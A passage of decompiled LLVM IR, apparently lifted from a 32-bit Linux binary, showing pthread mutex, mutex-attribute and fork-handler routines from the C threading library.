  %v1_804eea9 = icmp eq i8 %v3_804ee95, 0
  br i1 %v1_804eea9, label %dec_label_pc_804eef1, label %dec_label_pc_804eead

dec_label_pc_804eead:                             ; preds = %dec_label_pc_804ee95
  %v0_804eead = load i32, i32* @global_var_8062a84.142, align 4
  %v2_804eead = icmp slt i32 %v0_804eead, 0
  br i1 %v2_804eead, label %dec_label_pc_804eef1, label %dec_label_pc_804eeb6

dec_label_pc_804eeb6:                             ; preds = %dec_label_pc_804eead
  %v0_804eeb6 = load i32, i32* %stack_var_-188, align 4
  %v2_804eeb6 = call i32 @thread_self.16(i32 %v0_804eeb6, i32 %tmp13)
  store i32 %v2_804eeb6, i32* %stack_var_-160, align 4
  %v2_804eecb = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_804eecb

dec_label_pc_804eecb:                             ; preds = %dec_label_pc_804eee7, %dec_label_pc_804eeb6
  %v0_804eed6 = load i32, i32* @global_var_8062a84.142, align 4
  store i32 %v0_804eed6, i32* %stack_var_-188, align 4
  %v3_804eedc = call i32 @__libc_write(i32 %v0_804eed6, i32 %v2_804eecb, i32 148)
  %v8_804eee4 = icmp eq i32 %v3_804eedc, -1
  %v1_804eee5 = icmp eq i1 %v8_804eee4, false
  br i1 %v1_804eee5, label %dec_label_pc_804eef1, label %dec_label_pc_804eee7

dec_label_pc_804eee7:                             ; preds = %dec_label_pc_804eecb
  %v0_804eee7 = load i32, i32* %stack_var_-188, align 4
  %v1_804eee7 = call i32 @__errno_location(i32 %v0_804eee7)
  %v1_804eeec = inttoptr i32 %v1_804eee7 to i32*
  %v2_804eeec = load i32, i32* %v1_804eeec, align 4
  %v11_804eeec = icmp eq i32 %v2_804eeec, 4
  br i1 %v11_804eeec, label %dec_label_pc_804eecb, label %dec_label_pc_804eee7.dec_label_pc_804eef1.loopexit_crit_edge

dec_label_pc_804eee7.dec_label_pc_804eef1.loopexit_crit_edge: ; preds = %dec_label_pc_804eee7
  br label %dec_label_pc_804eef1

dec_label_pc_804eef1:                             ; preds = %dec_label_pc_804eecb, %dec_label_pc_804eee7.dec_label_pc_804eef1.loopexit_crit_edge, %dec_label_pc_804eead, %dec_label_pc_804ee95
  br label %dec_label_pc_804eef3

dec_label_pc_804eef3:                             ; preds = %dec_label_pc_804ee7d, %dec_label_pc_804eef1
  %v0_804eefc = phi i32 [ %v0_804eefc3, %dec_label_pc_804ee7d ], [ 0, %dec_label_pc_804eef1 ]
  ret i32 %v0_804eefc

; uselistorder directives
  uselistorder i32 %v3_804ee4d, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_804ee4d, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32* %stack_var_-188, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 (i32, i32)* @thread_self.16, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804eef3, { 1, 0 }
  uselistorder label %dec_label_pc_804eef1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804ee7d, { 0, 2, 1 }
}

define i32 @__fresetlockfiles() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_804ef04 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_804ef04, i32* %ebx.global-to-local, align 4
  %v2_804ef09 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-8)
  %v3_804ef13 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-8, i32 1)
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_8062b7c.185 to i32*), align 4
  store i32 %storemerge8, i32* %ebx.global-to-local, align 4
  %v1_804ef329 = icmp eq i32 %storemerge8, 0
  %v1_804ef3811 = icmp eq i1 %v1_804ef329, false
  br i1 %v1_804ef3811, label %dec_label_pc_804ef20, label %dec_label_pc_804ef3a

dec_label_pc_804ef20:                             ; preds = %entry, %dec_label_pc_804ef20
  %storemerge12 = phi i32 [ %storemerge, %dec_label_pc_804ef20 ], [ %storemerge8, %entry ]
  %v1_804ef23 = add i32 %storemerge12, 56
  %v3_804ef27 = call i32 @pthread_mutex_init(i32 %v1_804ef23, i32* nonnull %stack_var_-8)
  %v0_804ef2c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ef2c = add i32 %v0_804ef2c, 32
  %v2_804ef2c = inttoptr i32 %v1_804ef2c to i32*
  %storemerge = load i32, i32* %v2_804ef2c, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804ef32 = icmp eq i32 %storemerge, 0
  %v1_804ef38 = icmp eq i1 %v1_804ef32, false
  br i1 %v1_804ef38, label %dec_label_pc_804ef20, label %dec_label_pc_804ef3a

dec_label_pc_804ef3a:                             ; preds = %dec_label_pc_804ef20, %entry
  %v1_804ef3e = call i32 @pthread_mutexattr_destroy(i32 %v2_804ef04)
  ret i32 %v1_804ef3e

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ef20, { 1, 0 }
}

define i32 @__pthread_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ef48 = load i32, i32* @ebx, align 4
  store i32 %v0_804ef48, i32* %stack_var_-4, align 4
  %v0_804ef49 = load i32, i32* @eax, align 4
  store i32 %v0_804ef49, i32* %ecx.global-to-local, align 4
  %v1_804ef4e11 = inttoptr i32 %v0_804ef49 to i32*
  %v2_804ef4e12 = load i32, i32* %v1_804ef4e11, align 4
  %v3_804ef4e13 = icmp eq i32 %v2_804ef4e12, 0
  br i1 %v3_804ef4e13, label %dec_label_pc_804ef5a, label %dec_label_pc_804ef70.loopexit

dec_label_pc_804ef5a:                             ; preds = %entry, %dec_label_pc_804ef5a.dec_label_pc_804ef4e_crit_edge
  %v1_804ef4e14 = phi i32* [ %v1_804ef4e, %dec_label_pc_804ef5a.dec_label_pc_804ef4e_crit_edge ], [ %v1_804ef4e11, %entry ]
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804ef63 = load i32, i32* %v1_804ef4e14, align 4
  %v15_804ef63 = icmp eq i32 %v2_804ef63, 0
  %v22_804ef63 = select i1 %v15_804ef63, i32 1, i32 %v2_804ef63
  store i32 %v22_804ef63, i32* %v1_804ef4e14, align 4
  %v1_804ef67 = zext i1 %v15_804ef63 to i32
  %v2_804ef67 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ef67 = and i32 %v2_804ef67, -256
  %v4_804ef67 = or i32 %v3_804ef67, %v1_804ef67
  store i32 %v4_804ef67, i32* %edx.global-to-local, align 4
  %v4_804ef6a = icmp eq i1 %v15_804ef63, false
  br i1 %v4_804ef6a, label %dec_label_pc_804ef5a.dec_label_pc_804ef4e_crit_edge, label %dec_label_pc_804ef6e

dec_label_pc_804ef5a.dec_label_pc_804ef4e_crit_edge: ; preds = %dec_label_pc_804ef5a
  %v0_804ef4e.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ef4e = inttoptr i32 %v0_804ef4e.pre to i32*
  %v2_804ef4e = load i32, i32* %v1_804ef4e, align 4
  %v3_804ef4e = icmp eq i32 %v2_804ef4e, 0
  br i1 %v3_804ef4e, label %dec_label_pc_804ef5a, label %dec_label_pc_804ef70.loopexit

dec_label_pc_804ef6e:                             ; preds = %dec_label_pc_804ef5a
  br label %dec_label_pc_804ef70

dec_label_pc_804ef70.loopexit:                    ; preds = %dec_label_pc_804ef5a.dec_label_pc_804ef4e_crit_edge, %entry
  br label %dec_label_pc_804ef70

dec_label_pc_804ef70:                             ; preds = %dec_label_pc_804ef70.loopexit, %dec_label_pc_804ef6e
  %storemerge = phi i32 [ 16, %dec_label_pc_804ef70.loopexit ], [ 0, %dec_label_pc_804ef6e ]
  %v2_804ef70 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ef70, i32* @edx, align 4
  %v2_804ef71 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ef71, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_804ef4e, { 1, 0 }
  uselistorder i1 %v15_804ef63, { 1, 0, 2 }
  uselistorder i32 %v2_804ef63, { 1, 0 }
  uselistorder i32* %v1_804ef4e14, { 1, 0 }
  uselistorder label %dec_label_pc_804ef5a, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ef73 = load i32, i32* @ebx, align 4
  store i32 %v0_804ef73, i32* %stack_var_-4, align 4
  %v0_804ef74 = load i32, i32* @eax, align 4
  store i32 %v0_804ef74, i32* %ecx.global-to-local, align 4
  %v1_804ef7911 = inttoptr i32 %v0_804ef74 to i32*
  %v2_804ef7912 = load i32, i32* %v1_804ef7911, align 4
  %v3_804ef7913 = icmp eq i32 %v2_804ef7912, 0
  br i1 %v3_804ef7913, label %dec_label_pc_804ef85, label %dec_label_pc_804ef9b.loopexit

dec_label_pc_804ef85:                             ; preds = %entry, %dec_label_pc_804ef85.dec_label_pc_804ef79_crit_edge
  %v1_804ef7914 = phi i32* [ %v1_804ef79, %dec_label_pc_804ef85.dec_label_pc_804ef79_crit_edge ], [ %v1_804ef7911, %entry ]
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804ef8e = load i32, i32* %v1_804ef7914, align 4
  %v15_804ef8e = icmp eq i32 %v2_804ef8e, 0
  %v22_804ef8e = select i1 %v15_804ef8e, i32 1, i32 %v2_804ef8e
  store i32 %v22_804ef8e, i32* %v1_804ef7914, align 4
  %v1_804ef92 = zext i1 %v15_804ef8e to i32
  %v2_804ef92 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ef92 = and i32 %v2_804ef92, -256
  %v4_804ef92 = or i32 %v3_804ef92, %v1_804ef92
  store i32 %v4_804ef92, i32* @edx, align 4
  %v4_804ef95 = icmp eq i1 %v15_804ef8e, false
  br i1 %v4_804ef95, label %dec_label_pc_804ef85.dec_label_pc_804ef79_crit_edge, label %dec_label_pc_804ef99

dec_label_pc_804ef85.dec_label_pc_804ef79_crit_edge: ; preds = %dec_label_pc_804ef85
  %v0_804ef79.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ef79 = inttoptr i32 %v0_804ef79.pre to i32*
  %v2_804ef79 = load i32, i32* %v1_804ef79, align 4
  %v3_804ef79 = icmp eq i32 %v2_804ef79, 0
  br i1 %v3_804ef79, label %dec_label_pc_804ef85, label %dec_label_pc_804ef9b.loopexit

dec_label_pc_804ef99:                             ; preds = %dec_label_pc_804ef85
  br label %dec_label_pc_804ef9b

dec_label_pc_804ef9b.loopexit:                    ; preds = %dec_label_pc_804ef85.dec_label_pc_804ef79_crit_edge, %entry
  br label %dec_label_pc_804ef9b

dec_label_pc_804ef9b:                             ; preds = %dec_label_pc_804ef9b.loopexit, %dec_label_pc_804ef99
  %storemerge = phi i32 [ 16, %dec_label_pc_804ef9b.loopexit ], [ 0, %dec_label_pc_804ef99 ]
  %v2_804ef9b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ef9b, i32* %ecx.global-to-local, align 4
  %v2_804ef9c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ef9c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_804ef79, { 1, 0 }
  uselistorder i1 %v15_804ef8e, { 1, 0, 2 }
  uselistorder i32 %v2_804ef8e, { 1, 0 }
  uselistorder i32* %v1_804ef7914, { 1, 0 }
  uselistorder label %dec_label_pc_804ef85, { 1, 0 }
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  store i32 %tmp3, i32* @ecx, align 4
  store i32 3, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804efab = icmp eq i32* %arg2, null
  %v1_804efad = add i32 %arg1, 16
  %v2_804efad = inttoptr i32 %v1_804efad to i32*
  store i32 0, i32* %v2_804efad, align 4
  %v0_804efb4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804efb4 = add i32 %v0_804efb4, 20
  %v2_804efb4 = inttoptr i32 %v1_804efb4 to i32*
  store i32 0, i32* %v2_804efb4, align 4
  br i1 %v1_804efab, label %entry.dec_label_pc_804efbf_crit_edge, label %dec_label_pc_804efbd

entry.dec_label_pc_804efbf_crit_edge:             ; preds = %entry
  %v0_804efbf.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804efbf

dec_label_pc_804efbd:                             ; preds = %entry
  %v2_804efbd = load i32, i32* %arg2, align 4
  store i32 %v2_804efbd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804efbf

dec_label_pc_804efbf:                             ; preds = %entry.dec_label_pc_804efbf_crit_edge, %dec_label_pc_804efbd
  %v0_804efbf = phi i32 [ %v0_804efbf.pre, %entry.dec_label_pc_804efbf_crit_edge ], [ %v2_804efbd, %dec_label_pc_804efbd ]
  %v1_804efbf = load i32, i32* %eax.global-to-local, align 4
  %v2_804efbf = add i32 %v1_804efbf, 12
  %v3_804efbf = inttoptr i32 %v2_804efbf to i32*
  store i32 %v0_804efbf, i32* %v3_804efbf, align 4
  %v0_804efc2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804efc2 = add i32 %v0_804efc2, 4
  %v2_804efc2 = inttoptr i32 %v1_804efc2 to i32*
  store i32 0, i32* %v2_804efc2, align 4
  %v0_804efc9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804efc9 = add i32 %v0_804efc9, 8
  %v2_804efc9 = inttoptr i32 %v1_804efc9 to i32*
  store i32 0, i32* %v2_804efc9, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804efbf, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804efd7 = add i32 %arg1, 12
  %v2_804efd7 = inttoptr i32 %v1_804efd7 to i32*
  %v3_804efd7 = load i32, i32* %v2_804efd7, align 4
  %v2_804efda = icmp slt i32 %v3_804efd7, 0
  br i1 %v2_804efda, label %dec_label_pc_804efe8, label %dec_label_pc_804efde

dec_label_pc_804efde:                             ; preds = %entry
  %v7_804efe1 = icmp sgt i32 %v3_804efd7, 1
  br i1 %v7_804efe1, label %dec_label_pc_804efe3, label %dec_label_pc_804efee

dec_label_pc_804efe3:                             ; preds = %dec_label_pc_804efde
  %v7_804efe6 = icmp sgt i32 %v3_804efd7, 3
  br i1 %v7_804efe6, label %dec_label_pc_804efe8, label %dec_label_pc_804eff8

dec_label_pc_804efe8:                             ; preds = %dec_label_pc_804efe3, %entry
  ret i32 22

dec_label_pc_804efee:                             ; preds = %dec_label_pc_804efde
  %v1_804efee = add i32 %arg1, 16
  %v2_804efee = inttoptr i32 %v1_804efee to i8*
  %v3_804efee = load i8, i8* %v2_804efee, align 1
  %v4_804efee = urem i8 %v3_804efee, 2
  %v5_804efee = icmp eq i8 %v4_804efee, 0
  br i1 %v5_804efee, label %dec_label_pc_804f000, label %dec_label_pc_804effa

dec_label_pc_804eff8:                             ; preds = %dec_label_pc_804efe3
  %v1_804eff4 = add i32 %arg1, 16
  %v2_804eff4 = inttoptr i32 %v1_804eff4 to i32*
  %v3_804eff4 = load i32, i32* %v2_804eff4, align 4
  %v4_804eff4 = icmp eq i32 %v3_804eff4, 0
  br i1 %v4_804eff4, label %dec_label_pc_804f000, label %dec_label_pc_804effa

dec_label_pc_804effa:                             ; preds = %dec_label_pc_804efee, %dec_label_pc_804eff8
  ret i32 16

dec_label_pc_804f000:                             ; preds = %dec_label_pc_804efee, %dec_label_pc_804eff8
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804f000, { 1, 0 }
  uselistorder label %dec_label_pc_804effa, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_804f01f = icmp ugt i32 %arg2, 3
  br i1 %v6_804f01f, label %dec_label_pc_804f029, label %dec_label_pc_804f021

dec_label_pc_804f021:                             ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_804f029

dec_label_pc_804f029:                             ; preds = %entry, %dec_label_pc_804f021
  %v0_804f029 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804f021 ]
  ret i32 %v0_804f029

; uselistorder directives
  uselistorder label %dec_label_pc_804f029, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_804f02e = load i32, i32* %arg1, align 4
  %v2_804f034 = inttoptr i32 %arg2 to i32*
  store i32 %v2_804f02e, i32* %v2_804f034, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp2 = icmp eq i32 %tmp, 1
  br i1 %tmp2, label %dec_label_pc_804f054, label %dec_label_pc_804f05b

dec_label_pc_804f054:                             ; preds = %entry
  br label %dec_label_pc_804f05b

dec_label_pc_804f05b:                             ; preds = %entry, %dec_label_pc_804f054
  %v0_804f05b = phi i32 [ 22, %entry ], [ 38, %dec_label_pc_804f054 ]
  ret i32 %v0_804f05b

; uselistorder directives
  uselistorder label %dec_label_pc_804f05b, { 1, 0 }
}

define i32 @__pthread_once_fork_child() local_unnamed_addr {
entry:
  %v3_804f066 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_80633a8.193 to i32), i32* null)
  %v3_804f072 = call i32 @pthread_cond_init(i32* nonnull @global_var_80633c0.194, i32 0)
  %v0_804f077 = load i32, i32* @global_var_80633cc.195, align 4
  %v1_804f07f = add i32 %v0_804f077, -2147483643
  %v6_804f07f = sub i32 2147483642, %v0_804f077
  %v7_804f07f = and i32 %v6_804f07f, %v0_804f077
  %v8_804f07f = icmp slt i32 %v7_804f07f, 0
  %v9_804f07f = icmp eq i32 %v1_804f07f, 0
  %v10_804f07f = icmp slt i32 %v1_804f07f, 0
  %v3_804f084 = icmp eq i1 %v10_804f07f, %v8_804f07f
  %v4_804f084 = icmp eq i1 %v9_804f07f, false
  %v5_804f084 = and i1 %v4_804f084, %v3_804f084
  br i1 %v5_804f084, label %dec_label_pc_804f09a, label %dec_label_pc_804f086

dec_label_pc_804f086:                             ; preds = %entry
  %v1_804f086 = add i32 %v0_804f077, 4
  br label %dec_label_pc_804f09a

dec_label_pc_804f09a:                             ; preds = %entry, %dec_label_pc_804f086
  %storemerge = phi i32 [ %v1_804f086, %dec_label_pc_804f086 ], [ 0, %entry ]
  %v0_804f09d = phi i32 [ %v1_804f086, %dec_label_pc_804f086 ], [ %v0_804f077, %entry ]
  store i32 %storemerge, i32* @global_var_80633cc.195, align 4
  ret i32 %v0_804f09d

; uselistorder directives
  uselistorder i32 %v1_804f07f, { 1, 0 }
  uselistorder i32 %v0_804f077, { 1, 2, 0, 4, 3 }
  uselistorder label %dec_label_pc_804f09a, { 1, 0 }
}

define i32 @thread_self.18(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_804f09e = load i32, i32* @esp, align 4
  %v1_804f09e = load i32, i32* @global_var_806338c.133, align 4
  %v7_804f09e = icmp ult i32 %v0_804f09e, %v1_804f09e
  %v1_804f0a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_804f0a4, i32* @edx, align 4
  %v1_804f0ab = icmp eq i1 %v7_804f09e, false
  br i1 %v1_804f0ab, label %dec_label_pc_804f0dc, label %dec_label_pc_804f0ad

dec_label_pc_804f0ad:                             ; preds = %entry
  %v1_804f0ad = load i32, i32* @global_var_8063390.134, align 16
  %v7_804f0ad = icmp ult i32 %v0_804f09e, %v1_804f0ad
  br i1 %v7_804f0ad, label %dec_label_pc_804f0c2, label %dec_label_pc_804f0b5

dec_label_pc_804f0b5:                             ; preds = %dec_label_pc_804f0ad
  %v1_804f0b5 = load i32, i32* @global_var_8063394.135, align 4
  %v7_804f0b5 = icmp ult i32 %v0_804f09e, %v1_804f0b5
  br i1 %v7_804f0b5, label %dec_label_pc_804f0dc, label %dec_label_pc_804f0c2

dec_label_pc_804f0c2:                             ; preds = %dec_label_pc_804f0b5, %dec_label_pc_804f0ad
  %v0_804f0c2 = load i32, i32* @global_var_80679f0.137, align 16
  %v1_804f0c2 = icmp eq i32 %v0_804f0c2, 0
  br i1 %v1_804f0c2, label %dec_label_pc_804f0d0, label %dec_label_pc_804f0cb

dec_label_pc_804f0cb:                             ; preds = %dec_label_pc_804f0c2
  %v0_804f0cb = call i32 @__pthread_find_self()
  br label %dec_label_pc_804f0d0

dec_label_pc_804f0d0:                             ; preds = %dec_label_pc_804f0c2, %dec_label_pc_804f0cb
  %v3_804f0d0 = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_804f0d0, i32* @edx, align 4
  %v2_804f0d6 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804f0dc

dec_label_pc_804f0dc:                             ; preds = %dec_label_pc_804f0b5, %entry, %dec_label_pc_804f0d0
  %v0_804f0dc = phi i32 [ ptrtoint (i32* @global_var_80628a0.136 to i32), %dec_label_pc_804f0b5 ], [ ptrtoint (i32* @global_var_80626c0 to i32), %entry ], [ %v2_804f0d6, %dec_label_pc_804f0d0 ]
  ret i32 %v0_804f0dc

; uselistorder directives
  uselistorder label %dec_label_pc_804f0dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f0d0, { 1, 0 }
}

define i32 @pthread_mutex_unlock(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804f0dd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f0e5 = add i32 %arg1, 12
  %v2_804f0e5 = inttoptr i32 %v1_804f0e5 to i32*
  %v3_804f0e5 = load i32, i32* %v2_804f0e5, align 4
  %v1_804f0e8 = add i32 %v3_804f0e5, -1
  %v5_804f0e8 = icmp eq i32 %v3_804f0e5, 0
  %v9_804f0e8 = icmp eq i32 %v1_804f0e8, 0
  br i1 %v9_804f0e8, label %dec_label_pc_804f106, label %dec_label_pc_804f0ed

dec_label_pc_804f0ed:                             ; preds = %entry
  %v10_804f0e8 = icmp slt i32 %v1_804f0e8, 0
  %v6_804f0e8 = sub i32 0, %v3_804f0e5
  %v7_804f0e8 = and i32 %v3_804f0e5, %v6_804f0e8
  %v8_804f0e8 = icmp slt i32 %v7_804f0e8, 0
  %v3_804f0ed = icmp eq i1 %v10_804f0e8, %v8_804f0e8
  br i1 %v3_804f0ed, label %dec_label_pc_804f0f5, label %dec_label_pc_804f0ef

dec_label_pc_804f0ef:                             ; preds = %dec_label_pc_804f0ed
  br i1 %v5_804f0e8, label %dec_label_pc_804f126, label %dec_label_pc_804f0ff

dec_label_pc_804f0f5:                             ; preds = %dec_label_pc_804f0ed
  %v9_804f0f5 = icmp eq i32 %v3_804f0e5, 2
  br i1 %v9_804f0f5, label %dec_label_pc_804f139, label %dec_label_pc_804f0fa

dec_label_pc_804f0fa:                             ; preds = %dec_label_pc_804f0f5
  %v9_804f0fa = icmp eq i32 %v3_804f0e5, 3
  br i1 %v9_804f0fa, label %dec_label_pc_804f150, label %dec_label_pc_804f0ff

dec_label_pc_804f0ff:                             ; preds = %dec_label_pc_804f0ef, %dec_label_pc_804f0fa
  br label %dec_label_pc_804f163

dec_label_pc_804f106:                             ; preds = %entry
  %v1_804f106 = call i32 @thread_self.18(i32 %v0_804f0dd)
  %v0_804f10b = load i32, i32* @ebx, align 4
  %v1_804f10b = add i32 %v0_804f10b, 8
  %v2_804f10b = inttoptr i32 %v1_804f10b to i32*
  %v3_804f10b = load i32, i32* %v2_804f10b, align 4
  %v15_804f10b = icmp eq i32 %v3_804f10b, %v1_804f106
  %v1_804f10e = icmp eq i1 %v15_804f10b, false
  br i1 %v1_804f10e, label %dec_label_pc_804f15e, label %dec_label_pc_804f110

dec_label_pc_804f110:                             ; preds = %dec_label_pc_804f106
  %v1_804f110 = add i32 %v0_804f10b, 4
  %v2_804f110 = inttoptr i32 %v1_804f110 to i32*
  %v3_804f110 = load i32, i32* %v2_804f110, align 4
  %tmp12 = icmp slt i32 %v3_804f110, 1
  br i1 %tmp12, label %dec_label_pc_804f11f, label %dec_label_pc_804f117

dec_label_pc_804f117:                             ; preds = %dec_label_pc_804f110
  %v1_804f117 = add i32 %v3_804f110, -1
  store i32 %v1_804f117, i32* %v2_804f110, align 4
  br label %dec_label_pc_804f163

dec_label_pc_804f11f:                             ; preds = %dec_label_pc_804f110
  store i32 0, i32* %v2_804f10b, align 4
  %v0_804f129.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f126

dec_label_pc_804f126:                             ; preds = %dec_label_pc_804f0ef, %dec_label_pc_804f11f
  %v0_804f129 = phi i32 [ %arg1, %dec_label_pc_804f0ef ], [ %v0_804f129.pre, %dec_label_pc_804f11f ]
  %v1_804f129 = add i32 %v0_804f129, 16
  %v1_804f12d = inttoptr i32 %v1_804f129 to i32*
  %v2_804f12d = call i32 @__pthread_unlock(i32* %v1_804f12d)
  br label %dec_label_pc_804f132

dec_label_pc_804f132:                             ; preds = %dec_label_pc_804f150, %dec_label_pc_804f126
  br label %dec_label_pc_804f163

dec_label_pc_804f139:                             ; preds = %dec_label_pc_804f0f5
  %v1_804f139 = call i32 @thread_self.18(i32 %v0_804f0dd)
  %v0_804f13e = load i32, i32* @ebx, align 4
  %v1_804f13e = add i32 %v0_804f13e, 8
  %v2_804f13e = inttoptr i32 %v1_804f13e to i32*
  %v3_804f13e = load i32, i32* %v2_804f13e, align 4
  %v15_804f13e = icmp eq i32 %v3_804f13e, %v1_804f139
  %v1_804f141 = icmp eq i1 %v15_804f13e, false
  br i1 %v1_804f141, label %dec_label_pc_804f15e, label %dec_label_pc_804f143

dec_label_pc_804f143:                             ; preds = %dec_label_pc_804f139
  %v1_804f143 = add i32 %v0_804f13e, 16
  %v2_804f143 = inttoptr i32 %v1_804f143 to i32*
  %v3_804f143 = load i32, i32* %v2_804f143, align 4
  %v4_804f143 = icmp eq i32 %v3_804f143, 0
  br i1 %v4_804f143, label %dec_label_pc_804f15e, label %dec_label_pc_804f149

dec_label_pc_804f149:                             ; preds = %dec_label_pc_804f143
  store i32 0, i32* %v2_804f13e, align 4
  %v0_804f153.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f150

dec_label_pc_804f150:                             ; preds = %dec_label_pc_804f0fa, %dec_label_pc_804f149
  %v0_804f153 = phi i32 [ %arg1, %dec_label_pc_804f0fa ], [ %v0_804f153.pre, %dec_label_pc_804f149 ]
  %v1_804f153 = add i32 %v0_804f153, 16
  %v1_804f157 = inttoptr i32 %v1_804f153 to i32*
  %v2_804f157 = call i32 @__pthread_alt_unlock(i32* %v1_804f157)
  br label %dec_label_pc_804f132

dec_label_pc_804f15e:                             ; preds = %dec_label_pc_804f143, %dec_label_pc_804f139, %dec_label_pc_804f106
  br label %dec_label_pc_804f163

dec_label_pc_804f163:                             ; preds = %dec_label_pc_804f132, %dec_label_pc_804f117, %dec_label_pc_804f0ff, %dec_label_pc_804f15e
  %v0_804f166 = phi i32 [ 0, %dec_label_pc_804f132 ], [ 0, %dec_label_pc_804f117 ], [ 22, %dec_label_pc_804f0ff ], [ 1, %dec_label_pc_804f15e ]
  store i32 %v0_804f0dd, i32* @ebx, align 4
  ret i32 %v0_804f166

; uselistorder directives
  uselistorder i32 %v3_804f110, { 1, 0 }
  uselistorder i32 %v1_804f0e8, { 1, 0 }
  uselistorder i32 %v3_804f0e5, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_804f0dd, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804f163, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f150, { 1, 0 }
  uselistorder label %dec_label_pc_804f126, { 1, 0 }
  uselistorder label %dec_label_pc_804f0ff, { 1, 0 }
}

define i32 @__pthread_once_fork_parent() local_unnamed_addr {
entry:
  %v1_804f16f = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_80633a8.193 to i32))
  ret i32 %v1_804f16f
}

define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f178 = load i32, i32* @edi, align 4
  %v0_804f179 = load i32, i32* @esi, align 4
  %v0_804f17a = load i32, i32* @ebx, align 4
  store i32 %v0_804f17a, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @ebx, align 4
